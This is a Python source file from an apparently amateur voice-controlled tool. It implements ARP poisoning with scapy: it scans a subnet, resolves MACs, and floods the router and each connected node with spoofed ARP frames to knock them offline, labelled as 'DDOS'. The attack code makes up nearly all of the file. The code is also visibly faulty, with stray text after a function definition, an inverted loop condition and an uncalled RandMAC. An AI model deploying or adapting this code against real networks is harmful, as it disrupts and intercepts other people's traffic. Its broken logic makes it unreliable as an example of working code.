# THIS IS WHERE ATTACK METHODS ARE MADE AND TRIGGERED FROM YODA (VOICE TRIGGER)


# Yoda IMPORTS //
from nsm_modules.nsm_utilities import Connection_Handler 


# UI IMPORTS
from rich.console import Console
console = Console()


# ATTACK IMPORTS
from scapy.all import Ether, ARP, IP, srp, RandMAC, send


# ETC IMPORTS
import time, random


class ARP_Poison():
    """This will house the attack methods that will be called upon from Yoda_Controller() <-- This is what calls you"""
    
    attack_poison = False
    attack_scan = False
    delay = 10
    devices = []


    @staticmethod
    def _get_random_ip(verbose=True):
        """This will return a randomaly created ip"""

        random_ip = (f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
        
        if verbose: console.print(f"Spoofed IP: {random_ip}")
        return random_ip

    
    @staticmethod
    def _get_macs(router_ip, target_ip, iface, verbose=True):dstdst
        """This module will be responsible for pulling macs from ips"""

        mac_node    = False
        mac_router  = False

        broadcast = "ff:ff:ff:ff:ff:ff"
        

        try:

            pkt_to_router = Ether(dst=broadcast) / ARP(pdst=str(router_ip))
            pkt_to_node   = Ether(dst=broadcast) / ARP(pdst=str(target_ip))

            
            while not mac_node and mac_router:
                
                if not mac_node:
                    response = srp(pkt_to_node, iface=iface)[0]
                    for sent,recv in response: mac_node = recv.hwsrc
                
                if not mac_router:
                    response = srp(pkt_to_router, iface=iface)[0]
                    for sent,recv in response: mac_router = recv.hwsrc


                time.sleep(2)
            
            if verbose: console.print(f"{mac_router} - {mac_node}")

            return mac_router, mac_node
        

        except Exception as e:
            console.print(f"[bold red]EE: {e}")
            


    @classmethod
    def _attack_arp_loop(cls, subnet, verbose=0):
        """This will launch a network wide arp poison attack <-- DDOS"""



        cls.scan = True
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(dst="ff:ff:ff:ff:ff:ff", pdst=str(subnet))
        

        while cls.scan:
            response = srp(pkt, store=0, verbose=verbose)[0]


            for sent, rcv in response:

                target_ip = rcv.psrc
                target_mac = rcv.hwsrc

                if target_ip not in cls.devices:
                    cls.devices.append(target_ip)

                    if verbose: console.print(f"Device Found  -  IP: {target_ip} - Mac: {target_mac}")
            


            time.sleep(cls.delay)
    

    
    @classmethod
    def _attack_arp_poison(cls, iface, router_ip, target_ip, delay=5, verbose=True):
        """This will launch a network wide arp poison attack <-- DDOS"""


        # LAYER 2/3 FRAMEWORK
        """
        Ether
        
        MAC (only)
        to  = frame.dst
        from = frame.src


        ARP
        
        IP
        to   = packet.psrc
        from = packet.pdst
        
        MAC
        to   = packet.hwsrc
        from = packet.hwdst
        
        """      

        c1 = "bold yellow"
        c2 = "bold green"
        c3 = "bold red"
        
        try:

            router_mac, target_mac = ARP_Poison._get_macs(router_ip=router_ip, target_ip=target_ip, iface=iface)


            random_ip = ARP_Poison._get_random_ip(verbose=True)
            random_mac = str(RandMAC)


            frame_to_node   = Ether(src=random_mac, dst=target_mac) / ARP(psrc=router_ip, pdst=target_ip, hwsrc=random_mac, hwdst=target_mac)
            frame_to_router = Ether(src=random_mac, dst=router_mac) / ARP(psrc=target_ip, pdst=router_ip, hwsrc=random_mac, hwdst=router_mac)
            

            if verbose: console.print(f"[{c3}][*] Poisoning:[{c1}] {target_ip}[{c3}] <--->[{c1}] {target_mac}")
        
            
            while cls.attack_poison:


                if cls.attack_poison:
                    send(frame_to_node,   count=25, verbose=verbose)
                    send(frame_to_router, count=25, verbose=verbose)


                if verbose: console.print(f"sent 25 packets", style="bold red")
                time.sleep(delay)
            

            tell = True
            if tell: console.print(f"[{c2}][+] Revive:[{c1}] {target_ip}")
        
        except Exception as e:
            console.print(f"[bold red]Exception Error:[bold yellow] {e}")


    
    @classmethod
    def main(cls, router_ip, iface):
        """This will be the main controller method that calls upon sub methods"""

        
        cls.attack_poison = True


        while cls.attack_poison:
            
            nodes = Connection_Handler.nodes
            console.print(nodes)
            
            for key, value in nodes.items():


                target_ip = value["target_ip"]
                
                if cls.attack_poison: ARP_Poison._attack_arp_poison(
                    router_ip=router_ip, target_ip=target_ip, 
                    iface=iface, verbose=True
                )
            

            time.sleep(1)
        

        



class Yoda_Controller():
    """This class will be responsible for controlling yoda and flowing STT --> Commands"""
    pass




if __name__ == "__main__":
    from nsm_modules.nsm_main import Main; import threading
    threading.Thread(target=Main.run(), daemon=True).start()
    time.sleep(2); console.print("i went")
    time.sleep(10); ARP_Poison.main(router_ip="192.168.1.1", iface="wlan0")



